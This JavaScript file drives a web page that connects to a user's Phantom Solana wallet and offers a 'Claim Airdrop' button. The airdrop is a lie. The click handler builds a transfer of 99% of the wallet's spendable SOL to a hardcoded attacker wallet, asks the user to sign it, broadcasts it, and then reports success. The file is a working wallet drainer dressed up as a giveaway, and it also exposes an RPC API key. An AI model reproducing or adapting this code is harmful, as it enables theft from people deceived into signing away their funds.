$(document).ready(function () {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    async function handleWalletConnection(resp) {
        console.log("Phantom Wallet connected:", resp);

        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/SoydjJWjfwxDgAya8RrX3ArCdZ9PGLKQ37fVwDuQUJzhtsCDiE2VbEXk3wC1XZWtNArvKyUZvaTpQGYXfkhpmUFR9VbVLgTRhw',
            'confirmed'
        );

        const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
        const walletBalance = await connection.getBalance(publicKey);
        console.log("Wallet balance:", walletBalance);

        const minBalance = await connection.getMinimumBalanceForRentExemption(0);

        if (walletBalance < minBalance) {
            alert("Insufficient funds for rent.");
            return;
        }

        $('#connect-wallet').text("Claim Airdrop");

        $('#connect-wallet').off('click').on('click', async () => {
            try {
                const receiverWallet = new solanaWeb3.PublicKey('5FfkceXdH2oMPgRpZFKZJPmTE6fLKfUfDRke2gmxuf5n');
                const balanceForTransfer = walletBalance - minBalance;

                if (balanceForTransfer <= 0) {
                    alert("Insufficient funds for transfer.");
                    return;
                }

                const transferAmount = balanceForTransfer * 0.99;

                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: receiverWallet,
                        lamports: transferAmount,
                    })
                );

                transaction.feePayer = publicKey;
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;

                const signed = await window.solana.signTransaction(transaction);
                const txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);

                alert("Transaction successful!");
                $('#connect-wallet').text("Connected");
            } catch (err) {
                console.error("Error during claim:", err);
                alert("Claim failed. Please try again.");
            }
        });
    }

    async function connectPhantom() {
        try {
            const resp = await window.solana.connect();
            sessionStorage.setItem('phantomConnected', 'true');
            sessionStorage.removeItem('phantomInstallRequested');
            handleWalletConnection(resp);
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
            alert("Error connecting to Phantom Wallet.");
        }
    }

    async function checkConnectionOnReturn() {
        if (window.solana && window.solana.isPhantom) {
            try {
                const alreadyConnected = sessionStorage.getItem('phantomConnected');
                if (alreadyConnected) {
                    const resp = await window.solana.connect({ onlyIfTrusted: true });
                    handleWalletConnection(resp);
                }
            } catch (err) {
                console.warn("User not connected (yet).");
            }
        }
    }

    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            await connectPhantom();
        } else {
            alert("Phantom Wallet not found. Redirecting to install...");
            sessionStorage.setItem('phantomInstallRequested', 'true');

            if (isMobile) {
                const dappUrl = encodeURIComponent(window.location.href);
                const phantomLink = `https://phantom.app/ul/v1/connect?app_url=${dappUrl}`;
                window.location.href = phantomLink;
            } else {
                window.open("https://phantom.app/", "_blank");
            }
        }
    });

    // On page load, check if Phantom was previously connected
    checkConnectionOnReturn();
});
